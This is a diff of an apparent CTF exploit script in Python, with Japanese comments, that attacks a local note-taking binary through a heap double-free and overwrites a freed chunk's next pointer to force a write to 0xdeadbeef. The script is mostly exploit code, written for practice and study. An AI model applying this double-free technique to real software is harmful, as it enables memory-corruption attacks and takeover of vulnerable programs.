@@ -86,19 +86,20 @@ def delete_note(idx):
 
 banner = 'test'
 HOST, PORT = '127.0.0.1', 1337 
-"""
-    main.sh
-    # $socat TCP-LISTEN:1337,reuseaddr,fork exec:./main.sh
-    gdbserver localhost:1234 ./<chall_binary>
-"""
 
 logging.info(banner)
 s, f = sock(HOST, PORT)
+## ここからExploit ##
+
 A = create_note(0x10, b'A' * 0x0f)
+
+## double-free
 delete_note(A)
 delete_note(A)
-B = create_note(0x10, pQ(0xdeadbeef)) # nextメンバ書き換え
-C = create_note(0x10, b'\n') # リストの先頭にnextが0xdeadbeefを向いたチャンクが繋がっている. 
+
+
+create_note(0x10, pQ(0xdeadbeef)) # nextメンバ書き換え
+create_note(0x10, b'JUNK\n') # リストの先頭にnextが0xdeadbeefを向いたチャンクが繋がっている. 
 input('GDB?')
-D = create_note(0x10, b'SIGSEGV') # 0xdeadbeefへ書き込もうとしてSIGSEGV 
+create_note(0x10, b'SIGSEGV') # 0xdeadbeefへ書き込もうとしてSIGSEGV 
 shell(s)
